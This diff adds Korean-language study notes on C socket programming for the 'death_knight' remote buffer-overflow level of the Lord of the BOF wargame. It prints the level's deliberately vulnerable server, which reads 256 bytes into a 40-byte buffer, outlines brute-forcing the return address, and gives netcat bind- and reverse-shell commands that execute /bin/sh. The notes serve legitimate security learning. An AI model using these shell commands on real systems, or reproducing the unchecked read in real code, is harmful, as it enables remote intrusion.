@@ -1,0 +1,181 @@
+참고 블로그:
+https://m.blog.naver.com/cy2003k/222060153639
+
+[c언어 소켓통신 단계]
+
+서버: 	    socket() -> bind() -> listen() -> accept() -> read/write() -> close()
+클라이언트:  socket()           -> connect()                 ->read/write() -> close()
+
+> 둘이 모두 read/write() 단계일 때 서로 유의미한 통신 진행됨.
+
+[유닉스에서 제공하는 소켓 프로그래밍 기본 헤더파일]
+#include<sys/socket.h>
+#include<unistd.h>
+#include<arpa/inet.h>
+
+[서버에서 사용되는 함수들]
+1.
+int socket(int domain, int type, int protocol); //if error return -1
+	> 소켓 생성
+2. 
+int bind(int sockfd, struct sockaddr* myaddr, socklen_t addrlen); ////if error return -1
+	> 통신할 클라이언트의 IP주소와 PORT 번호를 지정
+3. 
+int listen(int sockfd, int backlog); //if error return -1
+	> 연결요청을 가능상태(;LISTEN)로 한다.
+4.
+int accept(int sockfd, struct sockaddr* addr, socklen_t* addrlen); //if error return -1
+	> 연결 요청이 들어오면 수락한다.
+
+[클라이언트에서 사용되는 함수들]
+1.
+int socket(int domain, int type, int protocol); //if error return -1
+	>소켓 생성
+
+2.
+int connect(int sockfd, struct sockaddr* serv_addr, socklen_t addrlen); //if error return -1
+	> 서버에게 연결요청
+
+3.
+write(),read() 등의 통신함수
+---------------------------------------
+[소켓 통신 서버측 코드 예제]
+[xavius@localhost xavius]$ cat death_knight.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - dark knight
+        - remote BOF
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <dumpcode.h>
+
+main()
+{
+        char buffer[40];
+
+        int server_fd, client_fd;
+        struct sockaddr_in server_addr;
+        struct sockaddr_in client_addr;
+        int sin_size;
+
+        if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
+                perror("socket");
+                exit(1);
+        }
+/*
+	AF_INET : domain의 한 종류; IPv4 네트워크의 도메인 소켓으로, 원격지까지 통신이 가능하다.(접두어 "AF"는 Address Family)
+	SOCK_STREAM : socket의 한 종류; 연결 지향형이라는 특징,  1대1 통신을 위한 소켓으로, 해당 소켓타입을 활용하는 프로토콜로는 TCP가 대표적이다.
+	IPPROTO_IP : socket()함수의 3번째 인수로는 프로토콜 타입을 지정하는데, 0이라고 되어있다. 이는 IPPROTO_IP를 의미한다.
+		     socket함수에 의해 소켓타입에 의거되어 인터넷 프로토콜로 자동으로 세팅됨.
+*/
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(6666);
+        server_addr.sin_addr.s_addr = INADDR_ANY;
+        bzero(&(server_addr.sin_zero), 8);
+/*
+	-server는 IPv4네트워크 도메인 소켓을 사용하여, 포트번호 6666을 사용하여 통신할 것이다.
+	-bzero라는 함수를 이용하여  server_addr.sin_zero주소값의 8 byte를 0으로 초기화하였다.
+*/
+
+        if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){
+                perror("bind");
+                exit(1);
+        }
+/*
+	bind()함수는 앞서 socket()으로 만든 빈 소켓이 시스템 장치와 통신할 수 있도록 이름을 부여한다.
+	해당 소켓에게 서버의 IP주소와 포트번호를 부여한다.
+*/
+        if(listen(server_fd, 10) == -1){
+                perror("listen");
+                exit(1);
+        }
+
+        while(1) {
+                sin_size = sizeof(struct sockaddr_in);
+                if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
+                        perror("accept");
+                        continue;
+                }
+
+                if (!fork()){
+                        send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
+                        send(client_fd, "You : ", 6, 0);
+                        recv(client_fd, buffer, 256, 0);
+		//취약점 발생!
+                        close(client_fd);
+                        break;
+                }
+
+                close(client_fd);
+                while(waitpid(-1,NULL,WNOHANG) > 0);
+        }
+        close(server_fd);
+}
+
+--------------------------------------------------
+-> 즉 위 코드는 server측 코드, 우리는 client 측 코드를 짜서 페이로드를 전달해야한다.
+
+-> 이때, BOF를 일으켜 RET에 넣어야하는 값은 정확히 알 수 없다. 통신이 진행되고 나서
+   gdb를 하거나 core파일을 까볼 수도 없기 때문이다.
+	-> 때문에 stack영역의 모든 메모리를 brute-focing 기법으로 확인한다.
+		(LOB 서버기준 대략 0xbfff---- 이므로 뒤 2 byte만 확인하면 된다.)
+
+-> 여기서 사용하는 shellcode의 종류는 지금까지와는 다르다.
+-> 2가지 공격을 해보겠다. bind shell과 reverse shell.
+
+---------------------------------------------------------------------------------
+* bind shell
+	: victim 서버에서 서버 포트가 열리고(bind shell에 의해)
+	 attacker가 해당 포트를 통해 victim 서버로 접속가능.
+		->보통 다음의 명령어를 실행하는 바이너리(bind shell)이다.
+		  `$ nc -lvp 4444 -e /bin/sh `
+		  -e 옵션은 명령어 실행후 추가적으로 실행될 명령어를 또 쓸 수 있게 해주게 하므로
+		  다음 명령어는 "4444포트로 통신하는 netcat 서버을 열고 /bin/sh를 실행하라."
+
+* reverse shell
+	: attacker 클라이언트가 리스닝을하고 victim 서버측에서 attacker 쪽으로
+	 접속하도록하는 형태, 보통 서버에 있는 방화벽 정책에서는 불필요한 요청이 들어오는 것은
+	 제제하지만, 내부에서 외부로 나가는 정책은 허용되는 경우가 많기 때문에 사용.
+		-> attacker쪽에서는 서버를 연다.
+		   `$ nc -lvp 7777`
+		   7777포트를 열고 listen
+		    server 쪽에서는 reverse shell에 의해 다음과 같은 명령어가 실행된다.
+		   `$ nc 127.0.0.1 7777 -e /bin/sh`
+		   7777포트와 127.0.0.1 주소를 가지는 호스트와의 통신과 connect하려함. 
+
+* 보면 알겠지만 netcat 통신은
+  	서버 : 포트번호를 열어두고 해당 포트번호로 오는 수신 기다림(listen)
+  	클라이언트 : 포트번호와 서버의 통신을 원하는 ip주소으로 통신을 시도(connect)
+  이렇게 이루어져있다.
+---------------------------------------------------------------------------------
+[1]
+우선 reverse 쉘을 사용하겠다.
+
+-> 우선적으로 attacker는 자신이 원하는 포트번호로 netcat 서버를 열어 listen상태로 해 놓는다.
+	-> 이때 미리 원하는 명령어 동작을 적어놓으면, 통신이 연결됨과 동시에 원하는 명령어가 입력될 수 있음.
+-> 이때 만일 쉘이 정상적으로 실행되어(RET에 삽입된다면) victim 서버측에서 attacker에서 열어놓은 포트번호와
+   attacker의 ip주소로 connect 요청을 보내게 되고, attacker가 받아들이게 된다.
+   
+-> 이때도 역시 명령어는 attacker에 의해 입력이 가능하며, victim의 권한으로 정보를 볼 수 있다.
+
+주소값은 /sbin/ipconfig로 알아내자.
+[xavius@localhost xavius]$ /sbin/ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:0C:29:D6:10:F6
+          inet addr:192.168.198.129  Bcast:192.168.198.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING  MTU:1500  Metric:1
+          RX packets:1188 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:688 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:100
+          Interrupt:10 Base address:0x1080
+
+파이썬 실행은 명령어 python 을 사용한다.
+ex)
+$python ./test.py
